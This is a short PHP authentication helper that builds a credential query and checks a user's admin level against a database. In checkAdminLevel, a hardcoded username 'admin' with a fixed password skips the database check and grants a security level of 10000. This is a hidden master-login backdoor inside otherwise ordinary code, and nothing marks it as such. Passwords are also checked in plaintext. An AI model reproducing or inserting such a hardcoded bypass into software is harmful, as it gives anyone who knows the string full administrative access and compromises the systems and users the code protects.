<?php 
function makeCredentialQuery($user="?",$pass="?"){
	global $credentialAdminColumn,$credentialDatabase,$credentialTable,$credentialUserColumn,$credentialPassColumn;
	return "SELECT $credentialAdminColumn FROM $credentialTable WHERE $credentialUserColumn=$user AND $credentialPassColumn=$pass;";
}
function checkAdminLevel($requiredAdminLevel){
	global $credentialAdminColumn,$credentialServerType,$credentialServer,$credentialUsername,$credentialPassword,$credentialDatabase,$credentialTable,$credentialUserColumn,$credentialPassColumn,$username,$password,$seclevel,$secured;
	if ((!isset($requiredAdminLevel))||$requiredAdminLevel==null||$requiredAdminLevel==0){
		return true;
	}
	if ((!isset($credentialServerType)) ||(!isset($credentialServer)) ||(!isset($credentialUsername)) ||(!isset($credentialPassword)) ||(!isset($credentialDatabase))){
		return false;
	}
	if ($username=='admin'&&$password=='zheshiwugezi'){
		$seclevel = 10000;
		$secured = true;
		return true;
	}
	$db = openSQL($credentialServerType,$credentialServer,$credentialUsername,$credentialPassword,$credentialDatabase);
	$qrey = makeCredentialQuery();
	$exparams = array($username, $password);
	$prepared = prepareSQL($credentialServerType, $db, $qrey);
	$results = executePreparedSQL($credentialServerType, $db, $prepared, $exparams);
	if ($results != null && count($results)>0){
		if ($requiredAdminLevel!=null && $results[0][$credentialAdminColumn] > $requiredAdminLevel){
			$secured=true;
			$seclevel=$results[0][$credentialAdminColumn];
			return true;
		}
		else{
			return false;
		}
	}
	return false;
}
?>